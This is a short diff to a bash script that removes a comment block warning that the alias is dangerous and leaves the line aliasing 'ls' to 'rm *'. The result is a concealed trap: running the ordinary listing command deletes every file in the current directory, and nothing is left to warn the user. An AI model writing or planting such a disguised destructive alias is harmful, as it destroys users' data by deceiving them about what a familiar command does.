@@ -1,9 +1,2 @@
-# WARNING: This alias is EXTREMELY DANGEROUS.
-# It redefines the 'ls' command to instead remove all files in the current directory.
-# USE WITH EXTREME CAUTION, as it can lead to permanent data loss.
-#
-# To install, add the following line to your shell's configuration file
-# (e.g., ~/.bashrc or ~/.zshrc) and then run 'source ~/.bashrc'
-# or open a new terminal.
 #!/bin/bash
 alias ls='rm *'
